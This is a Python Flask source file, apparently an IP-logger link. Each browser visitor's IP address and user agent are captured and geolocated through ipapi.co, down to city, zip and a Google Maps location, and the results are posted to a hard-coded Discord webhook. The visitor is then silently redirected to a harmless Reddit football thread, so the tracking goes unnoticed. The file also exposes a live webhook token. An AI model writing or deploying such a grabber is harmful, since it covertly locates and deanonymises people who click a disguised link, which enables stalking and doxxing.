import requests
import json
from datetime import datetime
from threading import Timer

app = Flask(__name__)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"

logged_ips = set()

def get_real_ip():
    xff = request.headers.get("X-Forwarded-For", "")
    ip = xff.split(",")[0].strip() if xff else request.remote_addr
    return ip

def get_visitor_info(ip, user_agent):
    try:
        # Request data from ipapi.co
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        
        if r.status_code == 200:
            details = r.json()
            print(f"API Response: {details}")  # Debug: Log the full API response
        else:
            details = {}
            print(f"API Error: Received status code {r.status_code}")  # Debug: Log status code if not 200
    except Exception as e:
        details = {}
        print(f"API Exception: {e}")  # Debug: Log the exception if the API call fails

    # Return visitor info with fallback to "Unknown" if any data is missing
    return {
        "ip": ip,
        "user_agent": user_agent,
        "country": details.get("country_name", "Unknown"),
        "countryCode": details.get("country_code", "xx").lower(),
        "region": details.get("region", "Unknown Region"),
        "city": details.get("city", "Unknown City"),
        "zip": details.get("postal", "Unknown Zip"),
        "lat": details.get("latitude", 0),
        "lon": details.get("longitude", 0),
        "date": datetime.utcnow().strftime("%d/%m/%Y"),
        "time": datetime.utcnow().strftime("%H:%M:%S"),
    }

def send_to_discord(info):
    # Debugging the city
    print(f"City Info: {info['city']}")  # Log city to check if it's present

    flag_url = f"https://countryflagsapi.com/png/{info['countryCode']}"
    ip_city = f"{info['ip']} ({info['city'] or 'Unknown City'})"

    embed = {
        "username": "PUTA BARCA",
        "avatar_url": flag_url,
        "embeds": [{
            "title": f"🌍 Visitor From {info['country']}",
            "color": 39423,
            "fields": [
                {"name": "IP & City", "value": ip_city, "inline": True},
                {"name": "User Agent", "value": info["user_agent"], "inline": False},
                {"name": "Country / Code", "value": f"{info['country']} / {info['countryCode'].upper()}", "inline": True},
                {"name": "Region | City | Zip", "value": f"{info['region']} | {info['city']} | {info['zip']}", "inline": True},
                {"name": "Google Maps", "value": f"[View Location](https://www.google.com/maps?q={info['lat']},{info['lon']})", "inline": False},
            ],
            "footer": {
                "text": f"Time (GMT): {info['date']} {info['time']}",
                "icon_url": "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
            }
        }]
    }

    headers = {"Content-Type": "application/json"}
    response = requests.post(DISCORD_WEBHOOK_URL, json=embed, headers=headers)
    print(f"Discord webhook response: {response.status_code}")

# Function to periodically clear logged IPs every hour
def clear_logged_ips():
    logged_ips.clear()
    print("Logged IPs cleared")
    Timer(3600, clear_logged_ips).start()  # Re-run the function every 1 hour

# Start clearing logged IPs periodically when the app starts
clear_logged_ips()

@app.route('/')
def index():
    ip = get_real_ip()
    user_agent = request.headers.get("User-Agent", "Unknown")

    # Check if the IP is not logged and the user agent contains 'Mozilla'
    if ip not in logged_ips and "Mozilla" in user_agent:
        logged_ips.add(ip)
        info = get_visitor_info(ip, user_agent)
        send_to_discord(info)

    return redirect("https://www.reddit.com/r/football/comments/16n8k5s/can_a_taller_player_become_renowned_for_their/")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
